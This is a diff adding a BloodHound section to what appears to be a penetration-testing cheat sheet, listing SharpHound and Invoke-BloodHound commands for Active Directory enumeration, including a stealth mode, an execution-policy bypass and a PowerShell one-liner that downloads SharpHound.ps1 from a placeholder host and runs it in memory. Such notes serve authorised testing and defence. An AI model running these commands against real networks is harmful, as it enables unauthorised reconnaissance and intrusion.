@@ -139,6 +139,45 @@ cat \\FILES04\docshare\docs\do-not-share\start-email.txt
 
 ```
 
+### BloodHound
+
+#### Ingestors
+```
+# Standard local execution
+./SharpHound.exe --CollectionMethods All,GPOLocalGroup
+Invoke-BloodHound -CollectionMethod All,GPOLocalGroup
+Invoke-BloodHound -CollectionMethod All -CompressData -RemoveCSV
+Invoke-BloodHound -CollectionMethod LoggedOn
+
+# Specify different domain and run in stealth mode and collect only RDP data
+Invoke-BloodHound --d <Domain> --Stealth --CollectionMethod RDP
+
+# Run in context of different user
+runas.exe /netonly /user:domain\user 'powershell.exe -nop -exec bypass'
+
+# Download and execute in memory
+powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('http://<IP>:/SharpHound.ps1');Invoke-BloodHound"
+
+# Metasploit
+use post/windows/gather/bloodhound       
+```
+
+#### Custom Queries
+
+```
+Replace the `customqueries.json` with one of the below files to update the custom queries within Bloodhound. Remember to restart Bloodhound after changing the JSON file.
+
+**Locate custom queries file**
+
+sudo find / -type f -name customqueries.json 2>/dev/null
+
+Add one of the queries below:
+https://github.com/CompassSecurity/BloodHoundQueries
+https://github.com/hausec/Bloodhound-Custom-Queries
+https://gist.github.com/seajaysec/a4d4a545047a51053d52cba567f78a9b
+
+
+```
 
 ### Automate
 
